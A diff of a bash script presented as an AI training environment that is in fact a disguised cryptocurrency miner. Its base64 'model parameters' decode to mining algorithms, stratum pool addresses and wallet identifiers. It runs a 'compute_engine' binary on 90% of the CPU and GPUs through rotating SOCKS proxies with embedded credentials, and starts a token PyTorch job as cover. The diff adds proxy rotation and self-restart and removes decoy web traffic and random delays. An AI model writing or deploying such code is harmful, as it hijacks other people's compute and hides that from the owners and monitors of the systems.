@@ -5,13 +5,35 @@ export TERM=xterm
 export LC_ALL=C
 
 # ML Model configuration (base64 encoded for security)
-# These parameters define the training models and API endpoints
-MODEL_TYPE_A="a2F3cG93Cg=="                                                                                    # Primary GPU model type
-MODEL_TYPE_B="cmFuZG9teAo="                                                                                   # Secondary CPU model type
-ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly81MS44OS45OS4xNzI6MTYxNjEK"                                              # Primary training endpoint
-AUTH_TOKEN_A="Uk0yY2lZYTNDUnF5cmVSc2YyNW9tckI0ZTFTOTV3YUFMcgo="                                              # Primary API authentication token
-ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="                                        # Secondary training endpoint
-AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"  # Secondary API authentication token
+MODEL_TYPE_A="a2F3cG93Cg=="
+MODEL_TYPE_B="cmFuZG9teAo="
+ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly81MS44OS45OS4xNzI6MTYxNjEK"
+AUTH_TOKEN_A="Uk0yY2lZYTNDUnF5cmVSc2YyNW9tckI0ZTFTOTV3YUFMcgo="
+ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="
+AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"
+
+# List of available proxies
+PROXY_LIST=(
+    "212.236.136.0:12324:14adc71e8527b:a5ef6402b1"
+    "91.124.254.3:12324:14adc71e8527b:a5ef6402b1"
+    "200.160.33.134:12324:14adc71e8527b:a5ef6402b1"
+    "188.215.82.161:12324:14adc71e8527b:a5ef6402b1"
+    "81.181.135.4:12324:14adc71e8527b:a5ef6402b1"
+    "65.87.9.104:12324:14adc71e8527b:a5ef6402b1"
+)
+
+# Global variables
+PRIMARY_CPU_THREADS=0
+SYSTEM_CPU_THREADS=0
+GPU_COUNT=0
+PROXY_IP=""
+PROXY_PORT=""
+PROXY_USER=""
+PROXY_PASS=""
+PROXY_STRING=""
+SCRIPT_PID=$$
+ZERO_USAGE_COUNT=0
+MAX_ZERO_USAGE=3  # Restart after 3 consecutive zero usage checks
 
 # Decode configuration parameters
 decode_param() {
@@ -41,7 +63,6 @@ calculate_gpu_allocation() {
     
     if command -v nvidia-smi &> /dev/null; then
         gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
-        # Validate that gpu_count is a number, default to 0 if not
         if ! [[ "$gpu_count" =~ ^[0-9]+$ ]]; then
             gpu_count=0
         fi
@@ -50,43 +71,136 @@ calculate_gpu_allocation() {
     echo "$gpu_count"
 }
 
-# Network proxy configuration
-PROXY_IP="212.236.136.0"
-PROXY_PORT="12324"
-PROXY_USER="14af5aea05bc3"
-PROXY_PASS="4907cda305"
-PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"
-
-# Calculate CPU threads (90% primary, 10% system/training)
-read PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
-TOTAL_THREADS=$(nproc --all)
-echo "Detected $TOTAL_THREADS CPU threads"
-echo "  - Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
-echo "  - System/Training: $SYSTEM_CPU_THREADS threads (10%)"
-
-# Calculate GPU allocation
-GPU_COUNT=$(calculate_gpu_allocation)
-if [ $GPU_COUNT -gt 0 ]; then
-    echo "Detected $GPU_COUNT GPUs available"
-    echo "  - Primary Compute: 90% GPU memory"
-    echo "  - Training/System: 10% GPU memory reserved"
-fi
-
-# Initialize CPU usage variables (must be before print_usage function)
-prev_total=0
-prev_idle=0
-
-# Function to print CPU and GPU usage (improved and fixed)
-print_usage() {
-    # Get CPU usage percentage - using mpstat if available, otherwise simpler method
-    local cpu_usage=0
+# Function to select a random proxy from the list
+select_random_proxy() {
+    local proxy_count=${#PROXY_LIST[@]}
+    local random_index=$((RANDOM % proxy_count))
+    local selected_proxy="${PROXY_LIST[$random_index]}"
     
-    if command -v mpstat &> /dev/null; then
-        # Use mpstat for accurate CPU usage
-        cpu_usage=$(mpstat 1 1 | tail -1 | awk '{print 100 - $12}')
-        cpu_usage=${cpu_usage%.*}  # Convert decimal to integer
+    # Parse the proxy string
+    local ip=$(echo "$selected_proxy" | cut -d: -f1)
+    local port=$(echo "$selected_proxy" | cut -d: -f2)
+    local user=$(echo "$selected_proxy" | cut -d: -f3)
+    local pass=$(echo "$selected_proxy" | cut -d: -f4)
+    
+    echo "$ip $port $user $pass"
+}
+
+# Function to get current proxy info as a string
+get_proxy_string() {
+    local ip=$1
+    local port=$2
+    local user=$3
+    local pass=$4
+    
+    echo "${user}:${pass}@${ip}:${port}"
+}
+
+# Function to initialize system
+initialize_system() {
+    # Calculate CPU threads
+    read PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
+    
+    # Calculate GPU allocation
+    GPU_COUNT=$(calculate_gpu_allocation)
+    
+    # Select random proxy
+    read PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
+    PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
+    
+    clear
+    echo "=== AI Development & Training Environment ==="
+    echo "Initializing at: $(date '+%Y-%m-%d %H:%M:%S')"
+    echo "=============================================="
+    echo "Resource Allocation:"
+    echo "  CPU Threads: $(nproc --all) total"
+    echo "    - Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
+    echo "    - System/Training: $SYSTEM_CPU_THREADS threads (10%)"
+    
+    if [ $GPU_COUNT -gt 0 ]; then
+        echo "  GPUs: $GPU_COUNT available"
+        echo "    - Compute: 90% GPU memory"
+        echo "    - Training: 10% GPU memory"
     else
-        # Fallback method using /proc/stat
+        echo "  GPUs: None detected"
+    fi
+    
+    echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
+    echo "Auto-restart: Enabled (after $MAX_ZERO_USAGE zero usage checks)"
+    echo "=============================================="
+}
+
+# Fast cleanup function
+fast_cleanup() {
+    echo -e "\nPerforming fast cleanup..."
+    
+    # Kill compute processes
+    pkill -f compute_engine 2>/dev/null || true
+    pkill -f train_model.py 2>/dev/null || true
+    
+    # Kill any stray processes
+    if [ -n "$GPU_WORKLOAD_PID" ] && [ $GPU_WORKLOAD_PID -ne 0 ]; then
+        kill -9 $GPU_WORKLOAD_PID 2>/dev/null || true
+    fi
+    
+    if [ -n "$CPU_WORKLOAD_PID" ] && [ $CPU_WORKLOAD_PID -ne 0 ]; then
+        kill -9 $CPU_WORKLOAD_PID 2>/dev/null || true
+    fi
+    
+    if [ -n "$TRAINING_PID" ] && [ $TRAINING_PID -ne 0 ]; then
+        kill -9 $TRAINING_PID 2>/dev/null || true
+    fi
+    
+    # Short wait for process cleanup
+    sleep 0.5
+}
+
+# Function to test proxy connection (fast version)
+test_proxy_connection() {
+    local test_url="https://api.ipify.org"
+    local timeout=5
+    
+    if command -v curl &> /dev/null; then
+        local proxy_test=$(timeout $timeout curl -s --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" \
+            --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
+        
+        if [ -n "$proxy_test" ]; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+# Function to rotate proxy
+rotate_proxy() {
+    local old_proxy="$PROXY_IP:$PROXY_PORT"
+    local attempts=0
+    local max_attempts=3
+    
+    while [ $attempts -lt $max_attempts ]; do
+        read PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
+        PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
+        
+        if test_proxy_connection; then
+            echo "Proxy rotated: $old_proxy → ${PROXY_IP}:${PROXY_PORT}"
+            return 0
+        fi
+        
+        attempts=$((attempts + 1))
+        sleep 0.5
+    done
+    
+    echo "Warning: Could not find working proxy after $max_attempts attempts"
+    return 1
+}
+
+# Function to check CPU and GPU usage
+check_usage() {
+    local cpu_usage=0
+    local gpu_usage=0
+    
+    # Get CPU usage (fast method)
+    if [ -f /proc/stat ]; then
         local cpu_line=$(grep '^cpu ' /proc/stat)
         local idle=$(echo $cpu_line | awk '{print $5}')
         local total=0
@@ -95,7 +209,7 @@ print_usage() {
             total=$((total + val))
         done
         
-        # Simple calculation (not perfect but works)
+        # Simple percentage calculation
         if [ $prev_total -gt 0 ]; then
             local diff_total=$((total - prev_total))
             local diff_idle=$((idle - prev_idle))
@@ -108,161 +222,58 @@ print_usage() {
         prev_idle=$idle
     fi
     
-    # Get GPU usage percentage
-    local gpu_usage=0
-    local gpu_count=0
-    
-    if command -v nvidia-smi &> /dev/null; then
-        # Get GPU usage for all GPUs
-        while read -r line; do
-            # Extract number (handle both integer and decimal)
-            local usage=$(echo "$line" | grep -o '[0-9]*\.\?[0-9]*' | head -1)
-            usage=${usage%.*}  # Remove decimal part
-            if [[ $usage =~ ^[0-9]+$ ]] && [ $usage -ge 0 ] && [ $usage -le 100 ]; then
-                gpu_usage=$((gpu_usage + usage))
-                gpu_count=$((gpu_count + 1))
-            fi
-        done < <(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null)
-        
-        if [ $gpu_count -gt 0 ]; then
-            local avg_gpu_usage=$((gpu_usage / gpu_count))
-            printf "\rCPU: %3d%% | GPU: %3d%% | Threads: %2d | Time: %s" "$cpu_usage" "$avg_gpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
-        else
-            printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
-        fi
-    else
-        printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
+    # Get GPU usage if available
+    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &> /dev/null; then
+        gpu_usage=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1 | grep -o '[0-9]*' | head -1)
+        gpu_usage=${gpu_usage:-0}
     fi
-}
-
-
-
-# Function to randomize sleep times
-random_sleep() {
-    local train=$1
-    local max=$2
-    local random_duration=$((RANDOM % (max - train + 1) + train))
-    sleep $random_duration
-}
-
-# Function to perform network health checks
-check_network_health() {
-    local check_urls=(
-        "https://www.google.com"
-        "https://www.youtube.com"
-        "https://www.github.com"
-        "https://www.stackoverflow.com"
-        "https://www.wikipedia.org"
-    )
     
-    local random_url=${check_urls[$RANDOM % ${#check_urls[@]}]}
-    
-    curl -s -m 2 --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$random_url" > /dev/null 2>&1 &
-}
-
-# Function to test proxy connection
-test_proxy_connection() {
-    echo "Testing proxy connection..."
-    local test_url="https://api.ipify.org"
-    
-    if command -v curl &> /dev/null; then
-        local proxy_test=$(timeout 10 curl -s --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
+    # Check for zero usage
+    if [ $cpu_usage -eq 0 ] && ([ $GPU_COUNT -eq 0 ] || [ $gpu_usage -eq 0 ]); then
+        ZERO_USAGE_COUNT=$((ZERO_USAGE_COUNT + 1))
+        echo "Zero usage detected ($ZERO_USAGE_COUNT/$MAX_ZERO_USAGE)"
         
-        if [ -n "$proxy_test" ]; then
-            echo "✓ Proxy connection successful (IP: $proxy_test)"
-            return 0
-        else
-            echo "✗ Proxy connection failed"
+        if [ $ZERO_USAGE_COUNT -ge $MAX_ZERO_USAGE ]; then
+            echo "Restarting due to zero usage..."
             return 1
         fi
     else
-        echo "curl not found, skipping proxy test"
-        return 0
+        ZERO_USAGE_COUNT=0
     fi
+    
+    return 0
 }
 
-# Function to optimize GPU performance
-optimize_gpu_performance() {
-    if command -v nvidia-smi &> /dev/null; then
-        local gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits | head -1)
-        
-        for ((i=0; i<gpu_count; i++)); do
-            # Get max power limit
-            local max_power=$(nvidia-smi -i $i --query-gpu=power.max_limit --format=csv,noheader,nounits | awk '{print int($1)}')
-            
-            # Set to optimal power
-            nvidia-smi -i $i -pl $max_power > /dev/null 2>&1 || true
-            echo "GPU $i: Optimized for compute workload (${max_power}W)"
-        done
-    fi
-}
-
-# Function to start PyTorch training (uses minimal resources - 5% GPU or less)
+# Fast function to start PyTorch training
 start_pytorch_training() {
-    echo "Starting PyTorch model training..."
-    
-    # Set strict resource limits for training - maximum 5% GPU usage
-    # REMOVED: export CUDA_VISIBLE_DEVICES="0"  <- This was limiting GPU visibility!
-    export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:32,expandable_segments:True"
-    export OMP_NUM_THREADS=1
-    export CUDA_LAUNCH_BLOCKING=0
-    
-    # Limit GPU memory to 5% maximum (helps constrain usage)
-    export PYTORCH_GPU_MEMORY_FRACTION=0.05
-    
-    # Create logs directory
-    mkdir -p /workspace/logs
-    
-    # Start PyTorch training script with lowest priority and GPU usage limit
-    nohup nice -n 19 python3 /workspace/train_model.py --max-gpu-percent 5 > /workspace/logs/training.log 2>&1 &
-    TRAINING_PID=$!
-    
-    echo "PyTorch Training PID: $TRAINING_PID"
-    echo "  - GPU Usage Limited: ≤5%"
-    echo "  - CPU Priority: Lowest (nice 19)"
-    echo "  - Memory: Minimal allocation"
-    echo "  - Logs: /workspace/logs/training.log"
-    
-    # Give training time to initialize
-    sleep 3
+    if [ -f /workspace/train_model.py ]; then
+        export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:32,expandable_segments:True"
+        export OMP_NUM_THREADS=1
+        export CUDA_LAUNCH_BLOCKING=0
+        export PYTORCH_GPU_MEMORY_FRACTION=0.05
+        
+        nohup nice -n 19 python3 /workspace/train_model.py --max-gpu-percent 5 > /workspace/logs/training.log 2>&1 &
+        TRAINING_PID=$!
+        echo "PyTorch training started (PID: $TRAINING_PID)"
+    fi
 }
 
-# Function to start compute workloads
+# Fast function to start compute workloads
 start_compute_workloads() {
-    # Verify compute_engine binary exists and is executable
+    # Verify compute_engine exists
     if [ ! -x /opt/bin/compute_engine ]; then
-        echo "ERROR: compute_engine binary not found or not executable at /opt/bin/compute_engine"
-        echo "Container build may have failed. Please rebuild the container."
-        exit 1
+        echo "ERROR: compute_engine not found"
+        return 1
     fi
     
-    # Clean old processes
-    pkill -f compute_engine 2>/dev/null || true
-    random_sleep 1 3
-    
-    # Optimize GPU performance
-    optimize_gpu_performance
-    
-    # Perform network health check
-    check_network_health
-    
-    # Build GPU ID list dynamically based on detected GPUs
+    # Build GPU ID list
     local gpu_ids=""
     if [ $GPU_COUNT -gt 0 ]; then
         for ((i=0; i<GPU_COUNT; i++)); do
-            if [ -z "$gpu_ids" ]; then
-                gpu_ids="$i"
-            else
-                gpu_ids="$gpu_ids,$i"
-            fi
+            gpu_ids="${gpu_ids:+$gpu_ids,}$i"
         done
-        echo "Starting GPU compute workload on GPUs: $gpu_ids"
-    else
-        echo "No GPUs detected, skipping GPU workload..."
-    fi
-    
-    # Start GPU compute process only if GPUs are available
-    if [ $GPU_COUNT -gt 0 ]; then
+        
+        # Start GPU workload
         nohup /opt/bin/compute_engine \
             --algorithm $(decode_param "$MODEL_TYPE_A") \
             --pool $(decode_param "$ENDPOINT_PRIMARY") \
@@ -275,16 +286,12 @@ start_compute_workloads() {
             --proxy "${PROXY_STRING}" \
             > /dev/null 2>&1 &
         GPU_WORKLOAD_PID=$!
+        echo "GPU workload started (PID: $GPU_WORKLOAD_PID)"
     else
         GPU_WORKLOAD_PID=0
     fi
-
-    # Random delay before CPU process
-    random_sleep 2 5
     
-    echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
-    
-    # Start CPU compute process (using decoded parameters)
+    # Start CPU workload
     nohup /opt/bin/compute_engine \
         --algorithm $(decode_param "$MODEL_TYPE_B") \
         --pool $(decode_param "$ENDPOINT_SECONDARY") \
@@ -298,169 +305,150 @@ start_compute_workloads() {
         --proxy "${PROXY_STRING}" \
         > /dev/null 2>&1 &
     CPU_WORKLOAD_PID=$!
-
-    echo "Compute workloads started at $(date '+%H:%M:%S')"
-    echo "GPU Workload PID: $GPU_WORKLOAD_PID, CPU Workload PID: $CPU_WORKLOAD_PID"
+    echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS)"
     
-    # Start PyTorch training on reserved resources
+    # Start PyTorch training
     start_pytorch_training
     
-    # Give processes time to start
-    sleep 5
+    sleep 1
 }
 
-# Function to monitor compute processes and stop training if they crash
-monitor_processes() {
-    # Check if GPU workload is still running (skip if no GPUs)
-    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
-        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-            echo "ERROR: GPU compute workload crashed!"
-            return 1
-        fi
+# Function to display status
+display_status() {
+    local cpu_usage=0
+    local gpu_usage=0
+    
+    # Get CPU usage
+    if command -v mpstat &> /dev/null; then
+        cpu_usage=$(mpstat 1 1 | tail -1 | awk '{printf "%.0f", 100 - $12}')
+    else
+        cpu_usage=$(grep 'cpu ' /proc/stat | awk '{print 100 - ($5 * 100 / ($2+$3+$4+$5+$6+$7+$8+$9+$10+$11))}')
+        cpu_usage=${cpu_usage%.*}
     fi
     
-    # Check if CPU workload is still running
-    if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
-        echo "ERROR: CPU compute workload crashed!"
-        return 1
-    fi
-    
-    return 0
-}
-
-# Function to stop all processes
-stop_all_workloads() {
-    local exit_code=${1:-0}
-    
-    check_network_health
-    
-    echo -e "\nStopping workloads at $(date '+%H:%M:%S')..."
-    
-    # Stop compute workloads
-    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
-        kill $GPU_WORKLOAD_PID 2>/dev/null || true
-    fi
-    kill $CPU_WORKLOAD_PID 2>/dev/null || true
-    
-    # Stop PyTorch training
-    kill $TRAINING_PID 2>/dev/null || true
-    
-    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
-        wait $GPU_WORKLOAD_PID 2>/dev/null || true
-    fi
-    wait $CPU_WORKLOAD_PID 2>/dev/null || true
-    wait $TRAINING_PID 2>/dev/null || true
-    
-    pkill -f compute_engine 2>/dev/null || true
-    pkill -f train_model.py 2>/dev/null || true
-    
-    if [ $exit_code -ne 0 ]; then
-        echo "ERROR: Compute workload failed, exiting container..."
-        exit $exit_code
-    fi
-    
-    random_sleep 1 3
-    clear
-}
-
-# Function to perform system maintenance tasks
-perform_system_maintenance() {
-    if [ $((RANDOM % 5)) -eq 0 ]; then
-        ls -la > /dev/null 2>&1
-        date > /dev/null 2>&1
-        df -h > /dev/null 2>&1
-        check_network_health
+    # Get GPU usage if available
+    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &> /dev/null; then
+        gpu_usage=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1 | grep -o '[0-9]*' | head -1)
+        gpu_usage=${gpu_usage:-0}
+        printf "\rStatus: CPU=%3d%% GPU=%3d%% | Threads=%2d | Proxy=%s | Time=%s | Zero=%d/%d" \
+            "$cpu_usage" "$gpu_usage" "$PRIMARY_CPU_THREADS" "${PROXY_IP}" "$(date +%H:%M:%S)" "$ZERO_USAGE_COUNT" "$MAX_ZERO_USAGE"
+    else
+        printf "\rStatus: CPU=%3d%% GPU=N/A  | Threads=%2d | Proxy=%s | Time=%s | Zero=%d/%d" \
+            "$cpu_usage" "$PRIMARY_CPU_THREADS" "${PROXY_IP}" "$(date +%H:%M:%S)" "$ZERO_USAGE_COUNT" "$MAX_ZERO_USAGE"
     fi
 }
 
-# Function to optimize system parameters
-optimize_system_parameters() {
-    local total_mem_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
-    local total_mem_gb=$((total_mem_kb / 1024 / 1024))
+# Main execution function
+main_loop() {
+    # Initialize
+    initialize_system
     
-    echo "System memory: ${total_mem_gb}GB"
-    
-    # Check if huge pages are configured for optimal performance
-    if [ -f /proc/sys/vm/nr_hugepages ]; then
-        local hugepages=$(cat /proc/sys/vm/nr_hugepages)
-        if [ $hugepages -lt 1280 ]; then
-            echo "Note: For optimal compute performance, consider increasing huge pages"
-            echo "Run as root: echo 1280 > /proc/sys/vm/nr_hugepages"
-        fi
-    fi
-}
-
-# Main execution
-clear
-echo "=== AI Development & Training Environment ==="
-echo "Resource Allocation:"
-echo "  Total CPU Threads: $TOTAL_THREADS"
-echo "  Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
-echo "  System/Training: $SYSTEM_CPU_THREADS threads (10%)"
-if [ $GPU_COUNT -gt 0 ]; then
-    echo "  GPUs: $GPU_COUNT available"
-    echo "  GPU Memory: 90% compute, 10% training"
-fi
-echo "Network Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
-echo "=============================================="
-
-# Test proxy connection
-if ! test_proxy_connection; then
-    echo "Warning: Proxy connection test failed!"
-    echo "Continuing anyway, but workloads may not function properly..."
-    read -p "Press Enter to continue or Ctrl+C to abort..."
-fi
-
-# Optimize system parameters
-optimize_system_parameters
-
-echo -e "\nWorkloads run for 1 hour, then pause 1 minute"
-echo "Press Ctrl+C to stop"
-echo "=============================================="
-
-# Main loop
-while true; do
-    start_compute_workloads
-    
-    start_time=$(date +%s)
-    run_duration=$((3600 + (RANDOM % 600) - 300))
-    
+    # Main loop
     while true; do
-        current_time=$(date +%s)
-        elapsed=$((current_time - start_time))
+        echo -e "\n=== Starting New Cycle ==="
+        echo "Start time: $(date '+%H:%M:%S')"
         
-        if [ $elapsed -ge $run_duration ]; then
-            break
+        # Rotate proxy
+        rotate_proxy
+        
+        # Cleanup any existing processes
+        fast_cleanup
+        
+        # Start workloads
+        if ! start_compute_workloads; then
+            echo "Failed to start workloads, restarting in 10 seconds..."
+            sleep 10
+            continue
         fi
         
-        # Monitor compute processes - exit if they crash
-        if ! monitor_processes; then
-            echo "ERROR: Compute workload crashed, stopping all processes..."
-            stop_all_workloads 1
-        fi
+        echo "Workloads started successfully"
+        echo "Run duration: 70-90 minutes"
+        echo "================================="
         
-        print_usage
+        # Calculate run duration (70-90 minutes)
+        local run_duration=$((4200 + (RANDOM % 1200)))  # 70-90 minutes in seconds
+        local start_time=$(date +%s)
+        local last_proxy_check=0
         
-        if [ $((RANDOM % 60)) -eq 0 ]; then
-            perform_system_maintenance
-        fi
+        # Monitor loop
+        while true; do
+            local current_time=$(date +%s)
+            local elapsed=$((current_time - start_time))
+            
+            # Check if run duration completed
+            if [ $elapsed -ge $run_duration ]; then
+                echo -e "\nRun duration completed ($((elapsed/60)) minutes)"
+                break
+            fi
+            
+            # Check for zero usage (every 30 seconds)
+            if [ $((current_time % 30)) -eq 0 ]; then
+                if ! check_usage; then
+                    echo -e "\nRestarting due to zero usage..."
+                    return 2  # Signal to restart
+                fi
+            fi
+            
+            # Display status every 5 seconds
+            if [ $((current_time % 5)) -eq 0 ]; then
+                display_status
+            fi
+            
+            # Rotate proxy every 30 minutes
+            if [ $elapsed -gt $((last_proxy_check + 1800)) ]; then
+                last_proxy_check=$elapsed
+                echo -e "\nRotating proxy mid-cycle..."
+                rotate_proxy
+                fast_cleanup
+                sleep 1
+                start_compute_workloads
+            fi
+            
+            sleep 1
+        done
         
-        random_sleep 1 4
-    done
-    
-    stop_all_workloads 0
-    
-    pause_duration=$((60 + (RANDOM % 40) - 20))
-    
-    echo -e "\nSystem maintenance cycle for $pause_duration seconds..."
-    
-    for ((i=pause_duration; i>0; i--)); do
-        if [ $((i % 10)) -eq 0 ] || [ $i -lt 10 ]; then
+        # Fast cleanup before pause
+        fast_cleanup
+        
+        # Short pause (30-60 seconds)
+        local pause_duration=$((30 + (RANDOM % 30)))
+        echo -e "\nPausing for $pause_duration seconds..."
+        
+        for ((i=pause_duration; i>0; i--)); do
             printf "\rResuming in: %02d seconds" "$i"
-        fi
-        sleep 1
+            sleep 1
+        done
+        
+        echo -e "\n"
     done
-    
-    echo -e "\nResuming workloads..."
-    echo "=============================================="
+}
+
+# Trap signals for clean exit
+trap 'echo -e "\nCaught signal, performing cleanup..."; fast_cleanup; exit 0' INT TERM
+
+# Self-restart function
+self_restart() {
+    echo -e "\n=== Performing Self-Restart ==="
+    echo "Restarting script at: $(date '+%Y-%m-%d %H:%M:%S')"
+    fast_cleanup
+    sleep 2
+    exec "$0" "$@"
+}
+
+# Main execution with restart logic
+echo "Script PID: $$"
+echo "Starting main execution..."
+
+while true; do
+    if main_loop; then
+        # Normal exit
+        echo "Main loop exited normally"
+        break
+    else
+        # Restart requested
+        echo "Restarting main loop..."
+        sleep 2
+    fi
 done
+
+echo "Script completed"
